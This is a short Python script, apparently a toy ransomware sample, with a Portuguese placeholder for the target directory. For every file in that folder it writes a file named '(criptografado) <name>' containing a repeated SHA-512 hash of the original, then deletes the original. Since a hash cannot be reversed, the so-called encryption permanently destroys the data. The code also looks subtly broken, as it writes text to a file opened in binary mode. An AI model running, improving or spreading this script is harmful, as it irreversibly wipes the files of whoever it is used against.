#!/usr/bin/env python3

import hashlib
import os

directory = '<inserir o diretório desejado>'

for files in os.listdir(directory):
	os.chdir(directory)
	with open(files, "rb") as read_binary:
		datas = read_binary.read()
		cripto = hashlib.sha512(datas).hexdigest()
		new_datas = f'(criptografado) {os.path.basename(files)}'
		with open(new_datas, "wb") as new:
			new.write(cripto * 0xFF)
			new.close()
			read_binary.close()

			os.remove(files)
